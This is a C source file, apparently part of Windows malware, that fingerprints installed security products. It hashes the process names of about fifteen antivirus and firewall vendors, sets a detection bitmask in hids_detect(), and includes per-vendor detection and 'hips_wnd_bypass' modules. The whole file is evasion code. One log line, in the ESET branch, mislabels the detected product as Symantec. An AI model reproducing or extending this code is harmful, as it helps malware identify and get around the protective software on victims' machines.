#define EKRN_EXE_HASH       0xd90a7896 // ekrn.exe  - ESET service process.
#define CCSVCHST_EXE_HASH   0x7ae72224 // ccSvcHst.exe - Symantec process.
#define SCHED_EXE_HASH      0x185ad196 // sched.exe - Avira Scheduler process.
#define AVP_EXE_HASH        0x56028094 // avp.exe - Kaspersky Antivirus process.
#define AVASTSVC_EXE_HASH   0xfaab2424 // AvastSvc.exe - avast! Service.
#define MCSVHOST_EXE_HASH   0x3b0f2726 // McSvHost.exe - McAfee Service Host.
#define CMDAGENT_EXE_HASH   0xdb2f0321 // cmdagent.exe - COMODO Internet Security.
#define AVGWDSVC_EXE_HASH   0xba2b2825 // avgwdsvc.exe - AVG Watchdog Service.
#define AVGCSRVX_EXE_HASH   0x7bf31425 // avgcsrvx.exe - AVG Scanning Core Module - Server Part.
#define ACS_EXE_HASH        0x56325a94 // acs.exe - Agnitum Outpost Service.
#define DWSERVICE_EXE_HASH  0x3acf0829 // dwservice.exe - Dr.Web Control Service.
#define PFSVC_EXE_HASH      0xd862f098 // pfsvc.exe - Privatefirewall Network Service.
#define MSMPENG_EXE_HASH    0xbaa6dda3 // Antimalware Service Executable.
#define MSSECES_EXE_HASH    0x3b0ed1a3 // Microsoft Security Client User Interface.
#define ISWSVC_EXE_HASH     0xf8eaf3a5 // ZoneAlarm Browser Security.
#define PCTSSVC_EXE_HASH    0x3a8af4a5 // PC Tools Security Component.
#define JPF_EXE_HASH        0x95627496 // jpf.exe - Jetico Personal Firewall Control Application.

#define PROACTIVE_NOT_CHECKED  0x00000000
#define PROACTIVE_NOT_DETECTED 0x80000000
#define HIPS_ESET       0x00000001
#define HIPS_SYMANTEC   0x00000002
#define HIPS_AVIRA      0x00000004
#define HIPS_KASPERSKY  0x00000008
#define HIPS_AVAST      0x00000010
#define HIPS_MCAFEE     0x00000020
#define HIPS_COMODO     0x00000040
#define HIPS_AVG        0x00000080
#define HIPS_OUTPOST    0x00000100
#define HIPS_DRWEB      0x00000200
#define HIPS_PRIVATEFW  0x00000400
#define HIPS_MSE        0x00000800
#define HIPS_ZONEALARM  0x00001000
#define HIPS_PCTOOLS    0x00002000
#define HIPS_JETICO     0x00004000
//#define PROACTIVE_OSSS  0x00008000
//#define PROACTIVE_BIT_DEFENDER 0x00010000

#include "eset.c"
#include "jetico.c"
#include "pctools.c"
#include "comodo.c"
#include "norton.c"
#include "osss.c"
#include "bitdefender.c"
#include "outpost.c"

void hids_detect()
{
    PROCESSENTRY32 processEntry;
    HANDLE hSnap;

    // Пробегаемся по списку процессов и ищем совпадения с известными именами файлов проактивных защит.
    hSnap = fn_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        if (fn_Process32First(hSnap, &processEntry)) {
            do {
                uint32_t hashVal = util_get_hash_from_istr_a(processEntry.szExeFile);
                if (hashVal == EKRN_EXE_HASH) {
                    globalData.gHIPSMask |= HIPS_ESET;
                    DbgMsg("Symantec detected!");
                }
                else if (hashVal == CCSVCHST_EXE_HASH) {
                    globalData.gHIPSMask |= HIPS_SYMANTEC;
                    DbgMsg("Symantec detected!");
                }
                else if (hashVal == SCHED_EXE_HASH) {
                    globalData.gHIPSMask |= HIPS_AVIRA;
                    DbgMsg("Avira detected!");
                }
                else if (hashVal == AVP_EXE_HASH) {
                    globalData.gHIPSMask |= HIPS_KASPERSKY;
                    DbgMsg("KAV detected!");
                }
                else if (hashVal == AVASTSVC_EXE_HASH) {
                    globalData.gHIPSMask |= HIPS_AVAST;
                    DbgMsg("Avast detected!");
                }
                else if (hashVal == MCSVHOST_EXE_HASH) {
                    globalData.gHIPSMask |= HIPS_MCAFEE;
                    DbgMsg("McAfee detected!");
                }
                else if (hashVal == CMDAGENT_EXE_HASH) {
                    globalData.gHIPSMask |= HIPS_COMODO;
                    DbgMsg("COMODO detected!");
                }
                else if (hashVal == AVGWDSVC_EXE_HASH || hashVal == AVGCSRVX_EXE_HASH) {
                    globalData.gHIPSMask |= HIPS_AVG;
                    DbgMsg("AVG detected!");
                }
                else if (hashVal == ACS_EXE_HASH) {
                    globalData.gHIPSMask |= HIPS_OUTPOST;
                    DbgMsg("Outpost detected!");
                }
                else if (hashVal == DWSERVICE_EXE_HASH) {
                    globalData.gHIPSMask |= HIPS_DRWEB;
                    DbgMsg("Dr.Web detected!");
                }
                else if (hashVal == PFSVC_EXE_HASH) {
                    globalData.gHIPSMask |= HIPS_PRIVATEFW;
                    DbgMsg("Privatefirewall detected!");
                }
                else if (hashVal == MSMPENG_EXE_HASH || hashVal == MSSECES_EXE_HASH) {
                    globalData.gHIPSMask |= HIPS_MSE;
                    DbgMsg("MSE detected!");
                }
                else if (hashVal == ISWSVC_EXE_HASH) {
                    globalData.gHIPSMask |= HIPS_ZONEALARM;
                    DbgMsg("ZoneAlarm detected!");
                }
                else if (hashVal == PCTSSVC_EXE_HASH) {
                    globalData.gHIPSMask |= HIPS_PCTOOLS;
                    DbgMsg("PC Tools detected!");
                }
                else if (hashVal == JPF_EXE_HASH) {
                    globalData.gHIPSMask |= HIPS_JETICO;
                    DbgMsg("Jetico detected!");
                }
            } while(fn_Process32Next(hSnap, &processEntry));
        }
        else {
            DbgMsg("hids_detect(): Process32First failed %X", fn_GetLastError());
        }
        fn_CloseHandle(hSnap);
    }
    else {
        DbgMsg("hids_detect(): CreateToolhelp32Snapshot failed %X", fn_GetLastError());
    }

    if (globalData.gHIPSMask == 0) {
        //ph_detect_bitdefender();
        ph_detect_outpost();
    }
}

#include "hips_wnd_bypass.c"